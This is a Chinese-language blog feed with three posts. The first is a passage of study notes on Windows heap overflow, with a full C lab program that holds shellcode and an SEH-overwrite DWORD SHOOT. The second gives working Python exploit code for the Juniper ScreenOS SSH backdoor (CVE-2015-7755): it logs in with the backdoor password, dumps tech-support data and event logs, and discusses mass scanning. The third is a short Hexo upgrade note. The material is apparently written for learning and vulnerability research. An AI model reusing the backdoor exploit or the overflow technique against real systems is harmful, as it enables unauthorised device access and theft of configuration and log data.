<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	node -&gt; <span class="built_in">blink</span> -&gt; flink = node -&gt; flink;</span><br><span class="line">	node -&gt; flink -&gt; <span class="built_in">blink</span> = node -&gt; <span class="built_in">blink</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，node可理解即为该节点数据区（而非块首）的地址，本例中可如下理解：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD ** node = <span class="number">0x00360758</span>; <span class="comment">//node指向尾块数据区</span></span><br><span class="line"></span><br><span class="line">node值为<span class="number">0x00360758</span>。</span><br><span class="line">*node值为<span class="number">0x00360688</span>，是被覆盖后的前向指针flink。</span><br><span class="line">*(node+<span class="number">4</span>)值为<span class="number">0x7FFDF020</span>，是被覆盖后的后向指针<span class="built_in">blink</span>。</span><br></pre></td></tr></table></figure>

<p>则如下操作就可以这样理解:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">node -&gt; flink 等价于 *(node+<span class="number">0</span>)，即*node</span><br><span class="line">node -&gt; <span class="built_in">blink</span> 等价于 *(node+<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>因此，上面的代码可以理解为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	*(*(node+<span class="number">4</span>)) = *node;</span><br><span class="line">	*(*node+<span class="number">4</span>) = *(node+<span class="number">4</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此本例可最终理解为进行了如下操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Memory(<span class="number">0x7FFDF020</span>) = <span class="number">0x00360688</span>; <span class="comment">//P.E.B DWORD SHOOT</span></span><br><span class="line">Memory(<span class="number">0x0036068C</span>) = <span class="number">0x7FFDF020</span>; <span class="comment">//指针反射</span></span><br></pre></td></tr></table></figure>

<p>如上代码中第一行向内存地址0x7FFDF020写入了DWORD值0x00360688，篡改了该处原来存储的指向临界区函数RtlEnterCriticalSection()的指针，因此在程序出错退出调用ExitProcess()时，就会需要到P.E.B便宜0x20处获得指向RtlEnterCriticalSection()函数的指针，结果获得的是shellcode的地址0x00360688，因此转而去执行shellcode。</p>
<p>但观察第二行代码，代码会向shellcode前部第5 Byte处写入DWORD 值0x7FFDF020，因此位于shellcode中的\x20\xF0\xFD\x7F会被当做机器码执行，这有可能影响shellcode的正确执行，这种现象叫做_<strong>指针反射</strong>_，好在本例中这些指令无关痛痒“，并没有影响shellcode关键代码的执行。</p>
<blockquote><p>但如果在为某个特定漏洞开发exploit时，指针反射发生且目标指针不能当做”无关痛痒“的指令安全地执行过去，那就得开动脑筋使用别的目标，或者使用跳板技术。这也是我介绍了很多种利用思路给大家的原因——要不然就只有自认倒霉了。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P177</cite></footer></blockquote>


<h4 id="2-通过S-E-H（异常处理结构体）实施攻击"><a href="#2-通过S-E-H（异常处理结构体）实施攻击" class="headerlink" title="(2) 通过S.E.H（异常处理结构体）实施攻击"></a>(2) 通过S.E.H（异常处理结构体）实施攻击</h4><h5 id="1-S-E-H利用原理"><a href="#1-S-E-H利用原理" class="headerlink" title="1) S.E.H利用原理"></a>1) S.E.H利用原理</h5><blockquote><p>操作系统或程序运行时，难免会遇到各种各样的错误，为了保证系统在遇到错误时不至于崩溃了，仍能够健壮稳定地继续运行下去，Windows会对运行在其中的程序提供一次补救的机会来处理错误，这种机制就是异常处理机制。</p>
<p>S.E.H即异常处理结构体（Structure Exception Handler），它是Windows异常处理机制所采用的重要数据结构。每个S.E.H包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄，共8个字节，如图6.1.1所示。</p>
<img data-src="/tech/heap-overflow-learning-notes-2/0day_6_1_1.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P178 -&gt; 图6.1.1">

<p>作为对S.E.H的初步了解，我们现在只需要知道一下几个要点，S.E.H链表如图6.1.2所示。</p>
<p>(1) S.E.H结构体存放在系统栈中。<br>(2) 当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的一场处理。<br>(3) 如果程序源代码中使用了<strong>try{}</strong>except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H来实现异常处理。<br>(4) 栈中一般会同时存在多个S.E.H<br>(5) 栈中的多个S.E.H通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的S.E.H通过T.E.B（线程环境块）0字节偏移处的指针标识。<br>(6) 当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。<br>(7) 当离”事故现场“最近的异常处理函数运行失败时，将顺着S.E.H链表依次尝试其他的异常处理函数。<br>(8) 如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P178-179</cite></footer></blockquote>

<img data-src="/tech/heap-overflow-learning-notes-2/0day_6_1_2.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P179 -&gt; 图6.1.2">

<blockquote><p>从程序设计角度来讲 ，S.E.H就是在系统关闭程序之前，给程序一个预先执行设定的回调函数（call back）的机会。大概明白了S.E.H的工作原理之后 ，聪明的读者朋友们可能已经发现了问题所在。<br>(1) S.E.H存放在栈中，故溢出缓冲区的数据有可能淹没S.E.H。<br>(2) 精心制造的溢出数据可以把S.E.H中异常处理函数的入口地址更改为shellcode的起始地址。<br>(3) 溢出后错误的栈帧或堆块数据往往会触发异常。<br>(4) 当Windows开始处理溢出后的异常时，会错误地把shellcode当作异常处理函数而执行。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P178-179</cite></footer></blockquote>

<h5 id="2-实验-1"><a href="#2-实验-1" class="headerlink" title="2) 实验"></a>2) 实验</h5><p>本实验通过淹没尾块块首，来触发DWORD SHOOT以修改S.E.H中第一个异常处理函数的地址，导致堆溢出产生错误需执行异常处理函数时实际却执行了shellcode。</p>
<p>本实验代码与第五章中代码类似，因此作者没有在随书代码中给出，下面给出我自己修改的版本：</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P184</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x36\x00"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">MyExceptionHandler</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line"></span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow, 0x200=512</span></span><br><span class="line">	</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	__try&#123;</span><br><span class="line">		h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyExceptionHandler())&#123;&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>可以观察到，本例中shellcode与上例中基本一致，不同之处有二：</p>
<ul>
<li>DWORD SHOOT的目标地址，即shellcode的最后4 Byte，本例中暂为\x90\x90\x90\x90，为异常处理函数地址，在进行一次调试确定后，再替换即可</li>
<li>本例中没有进行上例中对0x7FFDF020处临界区函数RtlEnterCriticalSection()指针的修复，因为本例中并没有改变它。</li>
</ul>
<p>在编译后执行程序之前，先改变OllyDBG设置，不忽略任何异常，如下图:</p>
<img data-src="/tech/heap-overflow-learning-notes-2/2_2_2_1.png" class="" title="图2.2.2.1">

<p>接着执行程序，在INT3处中断，观察此时栈中的S.E.H chain，View菜单 -&gt; SEH chain，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-2/2_2_2_2.png" class="" title="图2.2.2.2">

<p>但是，这时看到的SEH chain中并没有在我们的程序发生堆溢出异常时需要用到的第一个S.E.H。需要接着执行代码直到调用行的HeapAlloc()函数，这时会出现异常，指令窗口会从用户程序代码转入ntdll.dll中的内核代码，此时再观察S.E.H chain，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-2/2_2_2_3.png" class="" title="图2.2.2.3">

<p>观察上图，0x0012FF2C即为处理本程序第一个异常的S.E.H的地址，前面介绍过，S.E.H是个结构体，其中先后包含着下一个S.E.H的指针和异常处理函数指针，因此，我们DWORD SHOOT的目标地址为 (0x0012FF2C + 4) = 0x0012FF30。</p>
<p>接着，修改C代码第18行shellcode中DWORD SHOOT的目标地址为\x30\xFF\x12\x00，注释掉第33行的INT3中断，重新编译执行，成功弹窗。</p>
<p>可以看到，这次我们依然需要注释掉INT3，否则编译执行后进入OllyDBG调试后运行，程序是不会正常弹窗的，其原因在0day书中后文中有提到：</p>
<blockquote><p>当异常发生时，系统会顺着S.E.H链表搜索能够处理异常的句柄；一旦找到了恰当的句柄，系统会将已经遍历过的S.E.H中的异常处理函数再调用一遍，这个过程就是所谓的unwind操作，第二轮地调用就是unwind调用。</p>
<p>unwind操作通过kernel32.dll中的一个导出函数RtlUnwind实现，实际上kernel32.dll会转而再去调用ntdll.dll中的同名函数。</p>
<p>最后，还要堆栈中的异常处理做最后一点补充：在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P188-190</cite></footer></blockquote>

<p>从上文的解释就可以明白为什么我们的代码会触发异常后会进入ntdll的代码执行，而且也能解释为什么保留INT3编译执行后不会弹窗了，因为在处理异常时系统检测到当前处于调试器中，因此把该异常交给调试器处理了，而OllyDBG跟系统处理异常的方式不同，它并没有调用系统的异常处理函数，因此我们的shellcode没有得到执行。</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Bin</tag>
        <tag>Heap Overflow</tag>
        <tag>OllyDBG</tag>
        <tag>Security</tag>
        <tag>Windows</tag>
        <tag>Windows 2000</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（二）: SSH篇</title>
    <url>/tech/shell-interaction-in-python-2-ssh/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Shell Interaction in Python #2: SSH</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><h4 id="1-模块选择"><a href="#1-模块选择" class="headerlink" title="1. 模块选择"></a>1. 模块选择</h4><p>对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。</p>
<h5 id="1-paramiko"><a href="#1-paramiko" class="headerlink" title="(1) paramiko"></a>(1) paramiko</h5><p>SSH交互最常用的是第三方模块是paramiko：</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL2RvY3MucGFyYW1pa28ub3JnLw==">文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL3RyZWUvbWFzdGVyL3BhcmFtaWtv">源码<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<p>下面给出使用paramiko进行ssh登录的一个demo:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sshLogin</span><span class="params">(host, username, password, port=<span class="number">22</span>, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh.connect(</span><br><span class="line">            host,</span><br><span class="line">            username=username,</span><br><span class="line">            password=password,</span><br><span class="line">            timeout=timeout,</span><br><span class="line">            compress=<span class="literal">True</span>,</span><br><span class="line">            allow_agent=<span class="literal">False</span>,</span><br><span class="line">            look_for_keys=<span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.authenticated</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.get_banner()</span><br><span class="line">        stdin, stdout, stderr = ssh.exec_command(<span class="string">'ls'</span>, bufsize=<span class="number">1024</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stdout:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'... '</span> + line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        ssh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.AuthenticationException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.SSHException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>代码说明：</p>
<ul>
<li>17行：用于判断是否登录成功</li>
<li>18行：用于输出ssh banner，即登录成功后的欢迎字符串，比如我的vps登录成功后有如下欢迎字符串:</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Welcome to Ubuntu <span class="number">14.04</span><span class="number">.3</span> LTS (GNU/Linux <span class="number">3.13</span><span class="number">.0</span><span class="number">-68</span>-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:<span class="comment">//help.ubuntu.com/</span></span><br><span class="line">Last login: Wed Dec <span class="number">30</span> <span class="number">01</span>:<span class="number">55</span>:<span class="number">57</span> <span class="number">2015</span> <span class="keyword">from</span> <span class="number">222.222</span><span class="number">.222</span><span class="number">.222</span></span><br><span class="line"><span class="symbol">root@</span>vultr:~# c</span><br></pre></td></tr></table></figure>


<p>使用如上demo函数尝试登录我的vps，成功登录并打印了ls命令的输出。</p>
<p>但是存在如下问题：</p>
<ul>
<li>使用如上sshLogin函数登录juniper设备，代码运行到17行时输出为True，说明成功登录了，但当执行到第19行时，会出现如下错误：</li>
</ul>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/client.py"</span>, <span class="keyword">line</span> 405, <span class="keyword">in</span> exec_command</span><br><span class="line">    chan.exec_command(command)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 60, <span class="keyword">in</span> _check</span><br><span class="line">    <span class="keyword">return</span> func(self, *<span class="keyword">args</span>, **kwds)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 229, <span class="keyword">in</span> exec_command</span><br><span class="line">    self._wait_for_event()</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 1086, <span class="keyword">in</span> _wait_for_event</span><br><span class="line">    raise <span class="keyword">e</span></span><br><span class="line">paramiko.ssh_exception.SSHException: Channel closed.</span><br></pre></td></tr></table></figure>

<p>这会导致SSH连接的中断，导致这种异常的原因，可能是juniper这种设备的SSH实现是非标准的，而paramiko对这些非标准SSH支持不佳所致，而使用Unix/Linux自带的SSH客户端程序登陆这些设备就没有这种问题。看来paramiko并不是完美的解决方案，如果仅仅需要验证是否登陆成功，它还是可以满足的。</p>
<ul>
<li>无论目标是我的vps还是juniper设备，第18行输出的都是空字符串。在google上百度了一下，有人遇到类似问题（<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL2lzc3Vlcy8yNzM=">#1<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL3B1bGwvNTg=">#2<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yNTYwOTE1My9wYXJhbWlrby1lcnJvci1yZWFkaW5nLXNzaC1wcm90b2NvbC1iYW5uZXI=">#3<i class="fa fa-external-link-alt"></i></span>），也有人做了解答，但大都还是说调用get_banner()函数，并不是解决办法。猜测这可能是paramiko自身的问题，没有深究，如果您知道原因及解决办法，还请指教。</li>
</ul>
<h5 id="2-pexpect"><a href="#2-pexpect" class="headerlink" title="(2) pexpect"></a>(2) pexpect</h5><p>从Freebuf文章 <span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzkwODg2Lmh0bWw=">“利用Censys批量获取Juniper Netscreen后门”<i class="fa fa-external-link-alt"></i></span> 中了解到pexpect可以用来实现SSH交互，于是简单了解一番。</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3BleHBlY3QucmVhZHRoZWRvY3Mub3JnLw==">文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BleHBlY3QvcGV4cGVjdC90cmVlL21hc3Rlci9wZXhwZWN0">源码<i class="fa fa-external-link-alt"></i></span></li>
<li>相关资料:<ul>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDEv">探索 Pexpect，第 1 部分：剖析 Pexpect<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">探索 Pexpect，第 2 部分：Pexpect 的实例分析<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</li>
</ul>
<p>Freebuf的文章中提到了编写PoC验证设备是否还存在漏洞的思路：</p>
<blockquote>
<p>其实由于登录后并不是传统的SSH，而是该防火墙的操作终端，因此pxssh会认为并没有登录成功，而是返回超时异常，此时我们检测其返回的before字段如果有Remote Management Console字样就说明该主机存在后门。</p>
</blockquote>
<p>其中提到的pxssh是pexpect中的一个类pexpect.pxssh.pxssh，编写SSH交互程序需要用到它，使用示例参见<span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBM的文档<i class="fa fa-external-link-alt"></i></span>。</p>
<p>尝试了一番，pxssh其实是可以登陆成功的，并没有文章中所说的 “返回异常”。</p>
<p>其实pxssh底层实现还是以进程的方式调用Unix/Linux自带的SSH可执行程序的，而正如上面提到的自带的SSH兼容性很强，因此使用pxssh编写PoC是不错的选择。</p>
<p>但若将程序用于高并发扫描，需要权衡一下并发数与机器性能，因为每扫描一个目标就需要运行一个SSH客户端程序进程。</p>
<h4 id="2-Exp"><a href="#2-Exp" class="headerlink" title="2. Exp"></a>2. Exp</h4><p>PoC可以编写了，接下来是Exp，目标还是执行如下2个命令：</p>
<ul>
<li><em><strong>get tech-support</strong></em> : 它综合了大部分get子命令的结果。</li>
<li><em><strong>get event</strong></em> : 包含了设备日志。</li>
</ul>
<p>SSH Exp的逻辑与Telnet几乎一样，但是 pexpect.pxssh.pxssh 类中并没有类似于 telnetlib.Telnet 类中的 read_until(expected[, timeout]) 这种函数。</p>
<p>我们可以使用实例函数 pxssh.sendline(cmd) 来发送命令，其中cmd为命令字符串，结尾不必包含\n，函数会在命令结尾自动添加。</p>
<p>但使用pxssh编写Exp，还是存在如下问题：</p>
<ul>
<li>pxssh默认将上一次命令执行后返回的结果字符串存储在实例变量pxssh.before中，但是在多次获取结果分段时，连续2次获取的消息分段会有重叠。</li>
<li>从源码可以看到pxssh类继承自pexpect.pyt_spawn.spawn类，而spawn类又继承自pexpect.spawnbase.SpawnBase类。在SpawnBase类中，存在类变量buffer，用于接收服务器端发回的消息。因此尝试直接使用pxssh.buffer变量来代替before变量，并在每一次发送新的命令之前，将pxssh.buffer清空，但是又出现了结果不完整的问题。</li>
<li>可以尝试使用<span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBM的文章<i class="fa fa-external-link-alt"></i></span>中 “例 3：ssh 的使用” 提到的，直接使用spawn类来实现，但是该类较为底层，需要我们自己处理SSH的登录及交互逻辑，且其中expect函数的pattern参数需为pexpect.expect中定义的类实例，而不是直接传入字符串或正则表达式，使用起来较为繁琐。</li>
</ul>
<p>最终找到了合适的类函数 pexpect.pty_spawn.read_nonblocking(size=1, timeout=-1) ，它读取服务器端发来的数据，直到数据字节数达到size，或者达到超时时间timeout。但终止字符串就还需由我们自己判断。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pexpect <span class="keyword">import</span> pxssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">22</span>, loginTimeout=<span class="number">10</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        readTimeout=<span class="number">2</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">readUntilTimeout</span><span class="params">()</span>:</span></span><br><span class="line">            errFlag = <span class="literal">False</span></span><br><span class="line">            data = <span class="string">''</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> errFlag:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data += ssh.read_nonblocking(</span><br><span class="line">                        size=<span class="number">65536</span>,</span><br><span class="line">                        timeout=readTimeout</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">except</span> pexpect.exceptions.ExceptionPexpect <span class="keyword">as</span> err:</span><br><span class="line">                    errFlag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">        readUntilTimeout()  <span class="comment"># skip verbose strings</span></span><br><span class="line">        toNum = <span class="number">0</span></span><br><span class="line">        ssh.send(cmd + <span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        data = readUntilTimeout()</span><br><span class="line">        ret = data</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'-&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="number">-10</span>:]) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            data = readUntilTimeout()</span><br><span class="line">            ret += data</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ssh.send(<span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    ssh = pxssh.pxssh(timeout=readTimeout)</span><br><span class="line">    ssh.login(</span><br><span class="line">        server=host,</span><br><span class="line">        port=port,</span><br><span class="line">        username=<span class="string">'root'</span>,</span><br><span class="line">        password=<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span>,</span><br><span class="line">        auto_prompt_reset=<span class="literal">False</span>,</span><br><span class="line">        login_timeout=loginTimeout,</span><br><span class="line">    )</span><br><span class="line">    banner = ssh.before</span><br><span class="line">    ssh.sendline(<span class="string">'?'</span>)</span><br><span class="line">    help = ssh.read_nonblocking(size=<span class="number">65536</span>, timeout=readTimeout)</span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>

<p>代码说明：</p>
<ul>
<li>26行：连续发送多个\n，一次性将服务器端的多个结果分段获取到客户端的接收缓存中，这样可以减少交互，提高程序效率。</li>
<li>29行：判断每次读取的缓存区中的数据的后10个字符串中是否存在 <strong>-&gt;</strong> 字符，来识别最后一个结果分段。</li>
</ul>
<p>代码逻辑与Telnet程序类似。</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Security</tag>
        <tag>CVE</tag>
        <tag>PoC/Exp</tag>
        <tag>SSH</tag>
        <tag>Vul</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo &amp; Next 升级笔记</title>
    <url>/tech/hexo-next-upgrade-note/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Hexo &amp; Next Upgrade Note</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<p>几年没有碰Blog，最近打算重新开始写，因此需要更新hexo以及Next主题。</p>
<p>由于不怎么懂前端，不出意外意外地遇到了一堆坑，这里记录一下：</p>
<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ul>
<li>node: <code>v6.17.1</code>  =&gt; <code>v13.7.0</code></li>
<li>hexo: <code>v3.2.x</code> =&gt; <code>v4.2.0</code></li>
<li>next: <code>v4.x</code> =&gt; <code>v7.8.0</code></li>
</ul>
<h2 id="更新-node"><a href="#更新-node" class="headerlink" title="更新 node"></a>更新 node</h2><p> 我的系统使用nvm管理多版本node，首先更新npm：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g npm</span><br></pre></td></tr></table></figure>

<p>清除npm缓存，可能需要 sudo</p>
